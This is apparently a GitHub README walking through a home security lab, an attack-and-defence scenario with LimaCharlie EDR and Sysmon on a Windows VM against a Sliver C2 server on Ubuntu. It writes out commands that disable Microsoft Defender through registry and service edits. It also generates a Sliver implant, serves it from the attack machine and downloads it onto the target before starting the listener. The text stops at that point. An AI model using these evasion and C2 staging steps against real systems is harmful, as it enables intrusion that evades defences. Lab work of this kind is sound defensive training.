# HomeLab
This home lab demonstrates an attack and defense scenario that implements an EDR response using LimaCharlie on a Windows Machine against  Silver (attack ) from a C2 machine (Ubunutu). 

<h2>Disabling Microsoft Defender</h3>
<hr>
<i>What is Microsoft Defender?</i>

<br>Microsft Defender is a comprehensive security tool developed by Microsoft to protect against various types of malware and cyber threats. It includes
real-time protection, firewall and network protection, device performance monitoring and more. 

<i>What do we need to disable Microsoft Defender for this lab?</i>

<br><b> **Disclaimer. One should not disable Microsoft Defender on their local machine as it is inplaced to help keep your local machine protected from cyber attacks.  For demostaration purposes we will be disabling it on a VM.** </b>

<br> Disabling Microsoft Defender on our Windows Machine is imperative for the attack to be successfull. This will allow for our EDR (LimaCharlie) to detect the attack and respond to it. If Microsoft Defender and its features are enabled the attack will face greater challenges to exploit the Windows Machine. Again, for demostration purposes we will disable Microsoft Windows on a virtual machine to demostrate the attack and defense.   

<h3> Steps</h3>
Set up the Windows Machine, then sign into the machine.

<br>*** LINK HERE***

<h3> A. Disabling Tamper Protection</h3>
i. On your Windows Machine Click "Start" menu icon.
<br>ii. Click "Settings"
<br>iii. Click "Privacy and Security" 
<br>iv. Click "Windows Security"
<br>v. Click "Virus & Threat protection"
<br>vi. Underneath the "Virus & Threat protection settings" click "Manage Settings"
<br>vii. Toggle OFF the "Tamper protection" switch. When promtped click yes to allow the changes.

<br>![Screenshot (78)](https://github.com/user-attachments/assets/11c5d2c9-829f-4c22-8c43-2b2a225d0f04)

<br>VIII. Continue to toggle OFF ever other option here, then close the window we opened.

<h3>B. Disable Defender via Group Policy Editor</h3>
i. Click on "Start" menu icon.
<br>ii. In the search bar type "cmd" and right click to "Run as administrator" then run the command "gpedit.msc"
<br>iii. Once prompted , click Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus
<br>iv. Double-click "Turn off Microsoft Defender Antivirius", then select "Enabled" > Click "Apply" > Click "OK"

<br>![Screenshot (79)](https://github.com/user-attachments/assets/ab0d1ab4-e480-46ef-8e26-5e8cdacd79be)

<br> <i>** Enabling the policy will make it so that Microsoft Defenders Antivirius does not run and will not scan for malware and other unneeded software.  </i>

<h3>C. Perm. disable Defender via Registry </h3>
i. From the same command terminal , enter the command.

<br><i> REG ADD "hklm\software\policies\microsoft\windows defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f </i>

<h3> Prepare to boot into "Safe Mode" to disable all Defender services</h3>
i. Click "Start" menu icon
<br>ii. Type "msconfig" into the search bar within the Start Menu
<br>iii. Navigate to the "Boot" tab and select "Boot Options", from there you wil click the "Safe Boot" box leaving the "Minimal" button enabled. 
<br>iv. Click "Apply" > "OK". 

<br>![Screenshot (80)](https://github.com/user-attachments/assets/cda91548-4fa0-43bc-877b-7caaa7b42b81)



<br>v.Allow the System to "Restart" in Safe Mode and re-sign in. Once signed in you will notice the save mode at the top of the left corner of the Machine. 

<h3>Disabling services via the Registry while in Safe Mode</h3>
i. Click the "Start" menu icon
<br>ii. Search for "regedit" in the search menu. 
<br>iii. For each registry location you will need to browse to the key, "Start" value and change each one to 4. The registrys path you will need to follow is >  Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services...

<br> each will end in >  \Sense; \WdBoot; \ WindDefend; \WdNisDrv; \WdNisSvc; \WdFilter

<br>![Screenshot (81)](https://github.com/user-attachments/assets/9f687111-895b-4b32-8b9e-ff6224ec7788)

<br>iv. We will then go back into "msconfig" from the "Start Menu" icon and uncheck the "Safe boot" checkbox. Apply > OK and allow the sytem to restart. Microsoft Defender should no longer be on the System. 

<br>![Screenshot (82)](https://github.com/user-attachments/assets/16349792-c787-4241-8be2-fe0ffa6b9d05)

<h3>Prevent the Window VM from going into standby</h3>
i. Open a "cmd" in "Run as admin." and input the following commands. 

<br>powercfg /change standby-timeout-ac 0
<br>powercfg /change standby-timeout-dc 0
<br>powercfg /change monitor-timeout-ac 0
<br>powercfg /change monitor-timeout-dc 0
<br>powercfg /change hibernate-timeout-ac 0
<br>powercfg /change hibernate-timeout-dc 0

<h2>Installing Sysmon</h2>
<hr>
<i>What is Sysmon ?</i>
<br> Sysmon or System Monitor is a windows system service and device driver that logs system activity to the Windows event log such as process creation, network connections and file creation.

<br>i. We first want to launch an Admin. Powershell  on our Windows VM and then download Sysmon with the following command.
<br><i>Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip</i>

<br>ii. We will then unzip the Sysmon.zip with the command...
<br><i>Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon</i>

<br>iii. Next we will download SwiftOnSecurity's Sysmon config.
<br><i>Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile C:\Windows\Temp\Sysmon\sysmonconfig.xml</i>

<br>iv. We will then install Sysmon with Swift config.
<br><i>C:\Windows\Temp\Sysmon\Sysmon64.exe -accepteula -i C:\Windows\Temp\Sysmon\sysmonconfig.xml</i>

<br>v. Lets validate that we have Sysmon64 service installed.
<br><i>Get-Service sysmon64</i>

<br>vi.Lastly, we will check for the presence of Sysmon Event Logs. 
<br><i>Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10</i>

<hr>


<h2>Installing LimaCharlie EDR on the Windows VM</h2>
<hr>
<i> What is LimaCharlie </i>

<br> A SecOps cloud-based security tools and infrastructure

<h3>Setting up LimaCharlie</h3>
i. Go to LimaCharlie website and set up an account. Once the account is set up and question are answered "Create a new organization"
<br>ii. The name should be unique, "Data Residency Region" should be whatever is closest to you, in this cause for me it is USA. Demo Configuration should be disabled with the "Demo Configuration" "Template" set as "Extended Detection & Response Standard". Then click "Create Organization"

<br>![Screenshot (83)](https://github.com/user-attachments/assets/875dfde1-76ee-4566-9464-84b58014b4d7)

<br>iii. Once Org. is created you will need to click "Add Sensor". The credentials for this will be ass follow. Select "Windows" > provide a description for the key > click "Create" > Select Installation Key and select the key that was just created.

<br>iv. We then will install Windows sensor "x86.64(.exe)"

<br>** Do not click selected installer in step 2 on the website**

<br>![Screenshot (84)](https://github.com/user-attachments/assets/559a3809-fbac-49a1-b9a4-37cc104e6a4f)


<br>v. In the Windows machine you will open a new PowerShell as "Run as Admin." You then will need to enter the following command
<br> "<i> cd :C\Users\User\Downloads</i> " 
<br>**If folder not already created create one in this path**

<br>v. Enter the following command into the terminal. 
<br>Invoke-WebRequest -Uri https://downloads.limacharlie.io/sensor/windows/64 -Outfile C:\Users\User\Downloads\lc_sensor.exe

<br> From here you want to enter the command to shift into the standard command prompt
<br> "<i>cmd.exe</i>"

<br>vi. We then will copy the installer code that is provide from the LimaCharlie website into our terminal
<br>** code maybe mixing the "lc_sensor.exe" before the "-i" in the given installer code. Enter "lc_sensor.exe" prior to pastingn the installer code to ensure it will install properly. 

<br>![Screenshot (85)](https://github.com/user-attachments/assets/efa26cb3-2e08-4ad6-adc5-683dddd4add7)

<h3>Configuring LimaCharlie to ship Sysmon even logs alongside its own EDR telemetry</h3>
i. In your LimaCharlie account, on the leftside of the screen open the "Sensors" tab , find and click "Artifact Collection". 

<br>ii. Navigate to "Artifact Collection Rule" and click "+Add Artifact Collection Rule"

<br>iii. From here you will enter "wel://Microsoft-Windows-Sysmon/Operational:*" as your patterns, "10" will be the Retention Period, and "windows" will be the platform(s). Save the rule. 

<br>iv. Close all windows within your Windows VM machine and save the VM snapchat. This can be found in the VMware Workstation under the VM tab and click "Snapshot"

<hr>

<h2>Setup Attack System (Ubuntu)</h2>
<hr>

i. We should log into our Attack Machine (Ubuntu) and type in command line "sudo su". This command will allow or us to switch to a superuser or root with those privileges. 

<br>ii. We then want to check the the IP address of the machine by entering this command line "ip a". We should see the address under "inet". We also want to take note of the ethernet adapter above it. In our machince instance it says "ens33".

<br>iii. Becuase this IP address is a DHCP assigned IP address, there is a chance that it can change later on. We want to statically assigned the IP to the machine so that it will not change later. 

<br>iii. We must find the IP address of the gatway by using the command "ping _gateway -c 1". An IP address for the gateway should appear after the "PING _gateway" in the terminal. 

<br>iv. We want to configure the file for th network manager "netplan". Type is this command. 
<br><i>sudo nano /etc/netplan/00-installer-config.yaml</i>

<br>v. We then will edit the file by inputting our netowork information as such and save.;
<br>Network:
<br>ethernets:
<br>ens33:
<br>dhcp:no 
<br>addresses: [ YourIP# /Subnet#]
<br>gateway4: GatewayIP#
<br>nameservers:
<br>addresses:[8.8.8.8,...] 
<br> version:2

<br>vi. We will now type in the command "sudo netplan try" > then command "sudo netplan apply" > then check ping to Google DNS with command "ping 8.8.8.8". The IP should now be statically applied and we will now exit the command prompt.

<h2>Setup Attack System part 2.</h2>
We will be using the coommand prompt on our host machine, may it be Linux, Mac, Windows or any other third party tool to start a SSH to our Ubuntu VM. 

<br>i. We will open a command prompt on our host machine and type in 
<br><i> ssh user@Attack_VM_IP</i>

<br>![Screenshot (87)](https://github.com/user-attachments/assets/c5829963-34ed-46ad-a1d2-0e14671d83bf)


<br>ii. After gaining access we will input the command <i> sudo su </i> to help set up our C2 server by dropping us into the root shell.

<br>iii. Our next set of commands will be used to download Sliver, which will be our Command and Control (C2) framework. Follow these commands.

<br> wget https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-server_linux -O /usr/local/bin/sliver-server
<br> chmod +x /usr/local/bin/sliver-server
<br> apt install -y mingw-w64

<br>iv. We will now create a directory for future workings
<br> mkdir -p /opt/sliver

<h2> Generate C2 payload</h2>

i. We will begin a SSH session from into our Attack machine as we did earlier using the command ssh user_name@IP_Address > sudo su ( to drop into the rootshell). We will then drop into the root shell and cd into our dir we made for sliver server and then launch sliver using commands...

<br>cd /opt/sliver
<br> sliver-server 

<br>ii. We now will generate a  C2 session payload using are attacks machine static ip address we assigned the VM. Using command below. After the command is compiled it will provide us with a implant of the payload which we will need to confirm. the names for our executables are unique and everyones is different( note this for later). 

<br> generate --http [Linux_VM_IP] --save /opt/sliver

<br>![Screenshot (89)](https://github.com/user-attachments/assets/c03be165-58a9-4924-80b2-18f48c76cd8c)

<br> We now will confirm the implants by using the command "implants". Then "exit" after the implant is confirmed. 

<br>![Screenshot (90)](https://github.com/user-attachments/assets/7591b643-24a5-4066-88ab-3926f69e28e3)

<br>iii. We will now download the C2 payload from our attack machine to the Windows VM using python to spin up a temporary web server. Our commands in our SSH will be as such...
<br> cd /opt/sliver
<br> python3 -m http.server 80

<br> We will then stage our C2 payload using our Attack Machine  IP and the name of the unique payload we created. After staging we will snapshot the VM.

<br> IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe

<br>![Screenshot (91)](https://github.com/user-attachments/assets/5bb31884-44aa-42c7-9c27-a6015d5cba9e)

<h2>We will start and command the control session</h2>
i. Now the payload is on the Windows VM we will switch to our attack machine via the SSH session and enable Sliver HTTP server to call the callback. We first will terminate the python webserver we started ( ctrl + c) then relaunch sliver "sliver-server" is the command.
<br> ii. We will then start Sliver http listener with the command

<br><i>http</i>
